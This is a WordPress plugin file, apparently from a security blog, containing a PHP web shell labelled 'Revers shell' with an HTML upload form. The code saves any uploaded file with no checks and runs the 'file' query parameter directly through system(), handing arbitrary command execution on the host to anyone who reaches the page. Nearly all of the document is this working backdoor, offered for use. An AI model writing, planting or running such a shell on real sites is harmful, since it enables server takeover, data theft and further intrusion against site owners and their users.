<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
  Select Shell to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload File" name="submit">
</form>

</body>
</html>


<?php

/**

@wordpress-plugin
 *            Plugin Name: Revers shell
 *            Plugin URI: https://medium.com/securitythread
 *            Description: File Uplaod Shell
 *            Version: 1.0
 *            Author: Mukul Gautam
 *            Author URI: https://medium.com/securitythread
 *            
 */

$target_dir = "";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);

$file = $_GET['file'];
system($file);


?>


